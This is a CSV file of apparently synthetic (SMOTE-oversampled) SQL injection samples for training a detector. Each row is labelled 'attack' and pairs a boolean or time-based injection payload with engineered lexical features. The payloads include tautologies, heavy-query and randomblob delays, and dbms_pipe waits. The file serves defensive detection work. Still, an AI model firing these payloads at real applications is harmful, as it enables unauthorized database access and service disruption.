id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000364,attack,boolean,-7041'  )   where 6307  =  6307 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,nearest_attack_euclidean,R000770,0.2537781276233027,145.4758934977761,36.20964260088956,4.3202951703455605,57.0,26.0,42.58071479822088,19.89517869955522,0.3918621427487983,0.17874413528892555,0.29264164675681903,0.1367520752054571,4.8951786995552204,0.10482130044477955,3.0,-1.3877787807814457e-17,0.0,2.0,0.0,4.8951786995552204,0.0,-1.1102230246251565e-16,2.220446049250313e-16,9.0,1.0,0.10482130044477955,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000365,attack,boolean,"1""   )    )    and elt  (  3785  =  9386,9386  )   and    (    (   ""inwa"" like ""inwa",nearest_attack_euclidean,R000582,0.480862385997181,82.11792295684282,20.823701848026765,3.2133271542372888,20.294221108816057,12.058961478421411,38.0,11.764740369605352,0.24690447854743885,0.14621236932149778,0.46358379192355464,0.14329936020750872,0.0,4.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,6.0,0.0,-1.1102230246251565e-16,0.7647403696053531,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000366,attack,boolean,1'   )    )    and 4242  =  5831 and    (    (   'xflh' like 'xflh,nearest_attack_euclidean,R000268,0.3320019030500724,69.38703463692775,21.589049502074392,3.3187658976264456,19.030836628630187,9.589049502074392,31.178099004148784,9.589049502074392,0.2739306424965769,0.13779263796468505,0.45048408157405295,0.13779263796468505,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,4.294524751037196,0.0,0.14726237551859767,0.147262375518598,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000367,attack,boolean,"1  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R000414,0.2631861253214226,123.96457530147447,27.0,3.8854077555360744,71.0,8.0,33.37166024117957,11.592915060294892,0.5729709532726822,0.06456010741100646,0.26899311654447194,0.09347582277183936,0.0,0.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,4.592915060294893,0.0,-1.1102230246251565e-16,2.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000368,attack,boolean,"1'  )   as zxho where 5907  =  5907 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000618,0.29830012777763226,137.51245396583,36.51245396582998,3.879733220284754,42.512453965829984,23.0,53.8718865085425,18.128113491457494,0.3090895649818216,0.1672730526886116,0.3918194304247815,0.1318179519047853,3.0,0.0,2.0,1.0,0.0,2.0,0.0,9.0,0.0,-1.1102230246251565e-16,1.0,5.128113491457495,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.12811349145749518,0.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.128113491457495
SMOTE_000369,attack,boolean,"1'   )    )    as anaq where 9605  =  9605 and elt  (  4249  =  4249,7259  )  --",nearest_attack_euclidean,R000607,0.3831283487526416,76.2619112109702,25.252382242194038,3.60730028823655,15.504764484388076,21.0,30.006352645850768,9.750794080731346,0.2017170515701063,0.27759612780185117,0.39233212556096453,0.12835469506707803,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,2.0,0.0,3.750794080731346,0.0,-1.1102230246251565e-16,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000370,attack,boolean,-7663'   )    )    or 1558  =  1104 and    (    (   'wsrq'  =  'wsrq,nearest_attack_euclidean,R000561,0.5037822061942939,70.59836937470595,22.70864619310162,3.249822753620296,13.944861590802166,12.0,33.41729238620324,11.23621539770054,0.19684880608774566,0.17066633795672537,0.47305064450320744,0.15943421145232156,4.0,0.0,1.0,-1.3877787807814457e-17,0.0,1.7637846022994594,0.0,4.472430795401081,0.0,-1.1102230246251565e-16,2.220446049250313e-16,2.7637846022994594,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000371,attack,boolean,"1' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'ybjo'  =  'ybjo",nearest_attack_euclidean,R000350,0.32688838218537997,123.61959097803519,33.896734836994135,3.80893830791417,41.17387869595308,15.826121304046922,48.82612130404692,17.79346967398827,0.3334193142071438,0.1277695251608523,0.3947735900581132,0.1440375705738907,5.586939347976539,0.0,0.0,1.0,0.0,2.0,0.0,8.20653032601173,0.0,-1.1102230246251565e-16,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000372,attack,boolean,"1' in boolean mode  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",nearest_attack_euclidean,R000419,0.4352594893589047,121.90238078298017,32.783004908584154,3.7743331148330337,43.34901472575247,14.855336605722771,48.05968793719801,15.638341514306926,0.3558211435944124,0.12211596157596952,0.39398850983417016,0.12807438499544788,2.7830049085841564,0.0,0.0,0.9276683028613854,0.07233169713861465,1.0,0.0,8.783004908584156,0.0,0.07233169713861465,1.0,2.0,0.9276683028613854,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.07233169713861465,0.0,0.0,0.07233169713861459,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1446633942772293
SMOTE_000373,attack,boolean,"1 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000557,0.6622472774373326,91.30987590623435,27.30987590623435,3.6737531206403466,31.0,13.0,35.0,12.30987590623435,0.33951192629081883,0.1423759690896982,0.38331991677995675,0.13479218783952623,0.30987590623435013,0.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,6.0,0.0,1.0,1.0,4.0,0.3098759062343502,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000374,attack,boolean,"-1084 where 1181  =  1181 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000265,0.10033853843385454,68.04676130666462,25.080520100512665,3.8469420368033176,14.483120603075978,24.0,20.48312060307598,9.080520100512665,0.2122601533792511,0.35352196429851657,0.3006406444538802,0.13357723786835202,0.0,0.0,3.0,-1.3877787807814457e-17,0.0,2.0,0.0,2.080520100512664,0.0,1.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000375,attack,boolean,"1'  )   where 6941  =  6941 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",nearest_attack_euclidean,R000022,0.030549190068840718,148.09707908038664,32.0,3.8312173602957977,42.08321064033141,24.0,56.02773688011047,25.986131559944766,0.28414288811651306,0.16206059730038017,0.378320341314503,0.17547617326860387,0.9861315599447655,0.0,2.0,-1.3877787807814457e-17,0.0,2.0,0.0,11.0,0.0,2.0,1.0,10.0,0.9861315599447655,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000376,attack,boolean,"-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl",nearest_attack_euclidean,R000130,0.8721502831121185,101.54845347272209,28.096906945444175,3.440453076219867,22.19381389088835,16.0,46.903093054555825,16.451546527277912,0.21846302985102709,0.15756404042287386,0.4619381316074042,0.1620347981186948,4.0,0.0,1.0,-1.3877787807814457e-17,0.0,1.4515465272779133,0.0,8.0,0.0,1.0,1.0,2.4515465272779133,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000377,attack,boolean," select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",nearest_attack_euclidean,R000006,0.8067020904744768,65.59891741684157,22.0,3.44529750621041,26.0,4.433152902806929,25.732611611227718,9.43315290280693,0.39715393309457536,0.06737818339302283,0.3917139437550376,0.14375393975736425,0.0,2.0,2.0,-1.3877787807814457e-17,1.0,2.4331529028069294,0.0,1.0,0.0,-1.1102230246251565e-16,2.220446049250313e-16,5.433152902806929,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000378,attack,boolean,"1'||  (  select 'xpjg' where 3036  =  3036 and elt  (  1832  =  6644,6644   )    )   ||'",nearest_attack_euclidean,R000234,0.026948774268743474,88.0,28.875469920462077,3.839422446462908,20.999999999999996,21.0,31.0,15.0,0.23863636363636365,0.23863636363636365,0.3522727272727273,0.17045454545454544,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,4.0,0.0,-1.1102230246251565e-16,1.0,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000379,attack,boolean,"1""   )    )    and   (  3020  =  3020  )  *6703 and    (    (   ""bely""  =  ""bely",nearest_attack_euclidean,R000153,0.7379902725712405,75.65630587044257,18.710420391362838,3.0164745605441006,14.0,11.841681565451353,37.683363130902706,12.131261174088515,0.18669456111803923,0.15553895171545284,0.4977724645489449,0.15999402261756301,0.0,4.0,0.0,-1.3877787807814457e-17,0.710420391362838,2.0,0.0,5.420840782725676,0.0,-1.1102230246251565e-16,2.220446049250313e-16,2.7104203913628377,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000380,attack,boolean,"-5027%""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000517,1.3478828036605282,160.40738881922715,37.343912688461025,4.0720926682838705,59.12695226153228,18.0,58.31217462307795,24.96826193461693,0.3680342183454011,0.11226187193148872,0.3638008304607562,0.155903079262354,4.0,4.0,1.0,-1.3877787807814457e-17,0.0,1.6560873115389767,0.0,8.0,1.3121746230779532,-1.1102230246251565e-16,2.220446049250313e-16,6.656087311538976,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000381,attack,boolean,"1""  )   as nqtn where 5606  =  5606 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000625,0.0480033000721138,153.21775494936026,33.0,4.122180676756816,73.41331621202019,18.0,41.804438737340064,20.0,0.4790756462550458,0.1175093582508235,0.27284904188210457,0.1305659536120261,0.0,1.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,5.0,0.0,5.0,4.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000382,attack,boolean,"1   )    )    as oqfr where 6426  =  6426 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000205,0.6535944385411228,78.4341957844141,27.608548946103525,3.805742210614185,19.144731928138032,21.0,29.21709789220705,9.072365964069018,0.2435580969727015,0.26932570908189546,0.37174966234195456,0.11536653160344848,0.0,0.0,2.0,-1.3877787807814457e-17,0.0,2.0,0.0,3.536182982034509,0.0,0.536182982034509,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000383,attack,boolean,"1'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'tkcy' like 'tkcy",nearest_attack_euclidean,R000528,0.802149913004996,168.55366660486132,30.0,3.849236864962935,85.21466641944531,8.0,55.892666790277346,19.446333395138673,0.5055335879918048,0.04746304124968685,0.3316219013908671,0.11538146936764127,4.0,0.0,0.0,-1.3877787807814457e-17,1.0,1.4463333951386732,0.0,8.0,0.0,-1.1102230246251565e-16,2.0,2.446333395138673,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000384,attack,boolean,"1'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'sied'  =  'sied",nearest_attack_euclidean,R000417,0.08834304656250389,168.0,29.373351627375612,3.7978158407752978,83.0,8.0,57.0,20.0,0.49404761904761907,0.047619047619047616,0.3392857142857143,0.11904761904761904,4.0,0.0,0.0,-1.3877787807814457e-17,1.0,2.0,0.0,8.0,0.0,-1.1102230246251565e-16,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000385,attack,boolean,"1%"" or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000689,0.08741484898966237,105.0,34.962023562390776,3.8299920407466495,31.0,15.0,42.0,17.0,0.29523809523809524,0.14285714285714285,0.4,0.1619047619047619,2.037976437609225,0.9620235623907754,2.0,1.0,0.0,1.0,0.0,8.0,1.0,-1.1102230246251565e-16,1.0,4.0,1.0,0.9620235623907751,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998
SMOTE_000386,attack,boolean,"-4849""   )    )    or   (  5005  =  9111  )  *9111 and    (    (   ""catv"" like ""catv",nearest_attack_euclidean,R000630,0.7194789627739123,82.44510880043885,24.68902176008777,3.3303388508331233,17.0,14.756087040351069,38.0,12.689021760087767,0.20636424810014165,0.17847944101604407,0.4612847898709048,0.15387152101290952,0.0,4.0,1.0,-1.3877787807814457e-17,0.6890217600877674,1.0,0.0,6.0,0.0,-1.1102230246251565e-16,2.220446049250313e-16,2.6890217600877673,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000387,attack,boolean,"1 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000557,0.7543137752273367,91.29874063766373,27.59748127532746,3.686221498372062,31.29874063766373,13.0,35.0,12.0,0.3428003390181347,0.14239325987940413,0.3833664689060881,0.13143993219637307,0.0,0.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,6.0,0.0,1.0,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.29874063766373116,0.7012593623362688,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000388,attack,boolean,"1%""  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000229,0.25669958348398597,126.17524745141694,31.0,4.073139601915609,65.0,8.0,36.864497815500236,16.310749635916707,0.515489344721614,0.06344484242727558,0.29180399337124086,0.1292618194798695,0.0,1.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,5.3107496359167055,1.0,-1.1102230246251565e-16,2.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000389,attack,boolean,"1  )   where 2720  =  2720 and elt  (  4249  =  4249,7259  )  --",nearest_attack_euclidean,R000404,0.6156732521032663,62.97822808841706,22.34059063719431,3.5295862226773536,12.021771911582931,19.637637451222755,24.0,7.3188187256113775,0.19150432719485658,0.31128739933952304,0.3812813847023541,0.11592688876326629,0.0,0.0,2.0,-1.3877787807814457e-17,0.0,2.0,0.0,2.6594093628056883,0.0,-1.1102230246251565e-16,0.6594093628056887,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000390,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000066,1.1593748982056238,84.97028124440698,26.75551442049553,3.4727254195965305,20.21476682391145,13.837009613663687,38.0,12.918504806831843,0.23616838166401843,0.1620088586332619,0.4497976489698039,0.15202511073291577,0.0,4.0,1.0,-1.3877787807814457e-17,0.0,1.0,0.0,6.0,0.0,0.4592524034159216,0.4592524034159218,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000391,attack,boolean,"1""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""ubxw"" like ""ubxw",nearest_attack_euclidean,R000208,0.7627304715836613,136.30663500973156,32.69336499026844,3.63545651501773,46.30663500973156,13.0,59.0,18.0,0.3397164636579992,0.09537428858273345,0.4328525404908672,0.13205670726840016,0.0,4.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,10.0,0.0,1.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.3066350097315607,0.6933649902684393,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000392,attack,boolean,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""ikaf"" like ""ikaf",nearest_attack_euclidean,R000136,0.4176404964364172,134.57165371385483,31.571128381526883,3.71353432802677,46.85721790461828,14.286089523091396,54.428346286145164,19.0,0.34819622292773794,0.10606325925418159,0.4045430666712366,0.1411974511468439,2.0,3.8572179046182793,0.0,1.0,0.0,1.0,0.0,10.14278209538172,0.0,-1.1102230246251565e-16,1.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.14278209538172076,0.0,0.0,0.0,1.8572179046182795,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
